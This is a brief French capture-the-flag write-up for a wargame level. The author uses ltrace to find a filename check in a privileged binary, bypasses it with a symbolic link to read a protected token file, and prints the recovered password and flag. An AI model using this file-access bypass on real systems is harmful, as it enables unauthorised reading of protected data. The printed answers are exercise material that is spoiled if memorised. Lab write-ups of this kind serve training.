On trouve dans le dossier home un file token, dont nous ne pouvons lire le contenu et un binaire ./level08 qui, si on le lance nous affiche un message:
<pre><code>> ./level08
./level08 [file to read]
> ./level08 token
You may not access 'token'
</code></pre>

On cherche a savoir ce que le binaire fait, pour cela on utilise ltrace:
<pre><code>> ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")= "token"
printf("You may not access '%s'\n", "token"You may not access 'token')= 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
</code></pre>
> On observe le <code>strstr("token", "token")= "token"</code> qui veut dire que nous ne pouvons pas lire le fichier quand ce dernier s'appelle token

Donc on creer un lien symbolique avec un nom different afin de contourner la verification:
<pre><code>> ln -s `pwd`/token /tmp/mdp
./level08 /tmp/mdp
quif5eloekouj29ke0vouxean
</code></pre>

On test le mot de passe :
<pre>
<code>> su flag08</code>
<code>Password: quif5eloekouj29ke0vouxean</code>
</pre>

On obtient la phrase magique **Don't forget to launch getflag !**

<pre>
<code>> getflag</code>
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
</pre>
